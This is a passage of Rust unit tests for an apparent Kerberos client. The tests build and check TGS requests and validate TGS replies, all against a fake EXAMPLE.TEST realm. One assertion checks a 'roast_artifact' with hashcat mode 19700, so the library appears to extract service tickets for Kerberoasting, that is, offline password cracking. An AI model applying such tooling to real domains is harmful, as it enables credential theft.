            build_tgs_req(&tgt, "HTTP/web.example.test", 0x1020_3040, now, &mut OsRng).unwrap();
        let encoded = encode_der(&request).unwrap();
        let decoded: TgsReq = picky_asn1_der::from_bytes(&encoded).unwrap();
        assert_eq!(
            integer_as_u32(&decoded.0.req_body.0.nonce.0),
            Some(0x1020_3040)
        );
        assert_eq!(
            principal_name(&decoded.0.req_body.0.sname.0.as_ref().unwrap().0),
            "HTTP/web.example.test"
        );
        let pa_tgs = &decoded.0.padata.0.as_ref().unwrap().0.0[0];
        let ap_req: ApReq = picky_asn1_der::from_bytes(&pa_tgs.padata_data.0.0).unwrap();
        let plaintext = decrypt(
            KerberosEncryptionType::Rc4Hmac,
            &tgt.session_key,
            TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
            &ap_req.0.authenticator.0.cipher.0.0,
        )
        .unwrap();
        let authenticator: Authenticator = picky_asn1_der::from_bytes(&plaintext).unwrap();
        assert_eq!(principal_name(&authenticator.0.cname.0), "alice");
        assert_eq!(authenticator.0.crealm.0.0.to_string(), "EXAMPLE.TEST");
        let checksum = &authenticator.0.cksum.0.as_ref().unwrap().0;
        let (expected_type, expected) = keyed_checksum(
            KerberosEncryptionType::Rc4Hmac,
            &tgt.session_key,
            TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR_CKSUM,
            &encode_der(&decoded.0.req_body.0).unwrap(),
        )
        .unwrap();
        assert_eq!(integer_as_i32(&checksum.cksumtype.0), Some(expected_type));
        assert_eq!(checksum.checksum.0.0, expected);
    }

    #[test]
    fn validates_tgs_reply_before_exposing_service_ticket() {
        let now = OffsetDateTime::from_unix_timestamp(1_700_000_000).unwrap();
        let tgt = test_tgt(now);
        let nonce = 0x1122_3344;
        let reply_part = EncTgsRepPart::from(EncKdcRepPart {
            key: ExplicitContextTag0::from(EncryptionKey {
                key_type: ExplicitContextTag0::from(integer_i32(17)),
                key_value: ExplicitContextTag1::from(OctetStringAsn1::from(vec![0x22; 16])),
            }),
            last_req: ExplicitContextTag1::from(LastReq::from(Vec::new())),
            nonce: ExplicitContextTag2::from(integer_u32(nonce)),
            key_expiration: Optional::from(None),
            flags: ExplicitContextTag4::from(KerberosFlags::from(BitString::with_bytes(vec![
                0;
                4
            ]))),
            auth_time: ExplicitContextTag5::from(GeneralizedTimeAsn1::from(GeneralizedTime::from(
                now,
            ))),
            start_time: Optional::from(None),
            end_time: ExplicitContextTag7::from(GeneralizedTimeAsn1::from(GeneralizedTime::from(
                now + time::Duration::hours(10),
            ))),
            renew_till: Optional::from(None),
            srealm: ExplicitContextTag9::from(kerberos_string("EXAMPLE.TEST").unwrap()),
            sname: ExplicitContextTag10::from(principal(NT_SRV_INST, &["HTTP", "web"]).unwrap()),
            caadr: Optional::from(None),
            encrypted_pa_data: Optional::from(None),
        });
        let encrypted_reply = encrypt(
            KerberosEncryptionType::Rc4Hmac,
            &tgt.session_key,
            TGS_REP_ENC_SESSION_KEY,
            &encode_der(&reply_part).unwrap(),
            &mut OsRng,
        )
        .unwrap();
        let service_ticket = ticket_with_cipher(18, vec![0x33; 40]);
        let reply = TgsRep::from(KdcRep {
            pvno: ExplicitContextTag0::from(integer_i32(5)),
            msg_type: ExplicitContextTag1::from(integer_i32(13)),
            padata: Optional::from(None),
            crealm: ExplicitContextTag3::from(kerberos_string("EXAMPLE.TEST").unwrap()),
            cname: ExplicitContextTag4::from(principal(NT_PRINCIPAL, &["alice"]).unwrap()),
            ticket: ExplicitContextTag5::from(service_ticket),
            enc_part: picky_asn1::wrapper::ExplicitContextTag6::from(EncryptedData {
                etype: ExplicitContextTag0::from(integer_i32(23)),
                kvno: Optional::from(None),
                cipher: ExplicitContextTag2::from(OctetStringAsn1::from(encrypted_reply)),
            }),
        });
        let ticket = finish_tgs_exchange(reply, &tgt, "HTTP/web", nonce).unwrap();
        assert_eq!(ticket.service_principal_name(), "HTTP/web");
        assert_eq!(
            ticket.session_encryption_type(),
            KerberosEncryptionType::Aes128CtsHmacSha196
        );
        assert_eq!(
            ticket.roast_artifact("svc").unwrap().finding.hashcat_mode,
            19_700
        );
    }

    fn ticket_with_cipher(encryption_type: i32, cipher: Vec<u8>) -> Ticket {
        Ticket::from(TicketInner {
            tkt_vno: ExplicitContextTag0::from(integer_i32(5)),
            realm: ExplicitContextTag1::from(kerberos_string("EXAMPLE.TEST").unwrap()),
            sname: ExplicitContextTag2::from(principal(NT_SRV_INST, &["HTTP", "web"]).unwrap()),
            enc_part: ExplicitContextTag3::from(EncryptedData {
                etype: ExplicitContextTag0::from(integer_i32(encryption_type)),
                kvno: Optional::from(None),
                cipher: ExplicitContextTag2::from(OctetStringAsn1::from(cipher)),
            }),
        })
    }

    fn test_tgt(now: OffsetDateTime) -> TicketGrantingTicket {
        TicketGrantingTicket {
            ticket: Ticket::from(TicketInner {
                tkt_vno: ExplicitContextTag0::from(integer_i32(5)),
                realm: ExplicitContextTag1::from(kerberos_string("EXAMPLE.TEST").unwrap()),
                sname: ExplicitContextTag2::from(
                    principal(NT_SRV_INST, &["krbtgt", "EXAMPLE.TEST"]).unwrap(),
                ),
                enc_part: ExplicitContextTag3::from(EncryptedData {
                    etype: ExplicitContextTag0::from(integer_i32(18)),
                    kvno: Optional::from(None),
                    cipher: ExplicitContextTag2::from(OctetStringAsn1::from(vec![1, 2, 3])),
                }),
            }),
            session_key: vec![0x11; 16],
            session_encryption_type: KerberosEncryptionType::Rc4Hmac,
            client_principal: "alice".to_owned(),
            realm: "EXAMPLE.TEST".to_owned(),
            issued_at_unix: now.unix_timestamp(),
            valid_from_unix: now.unix_timestamp(),
            valid_until_unix: (now + time::Duration::hours(10)).unix_timestamp(),
            renewable_until_unix: None,
            ticket_flags: 0,
        }
    }
}
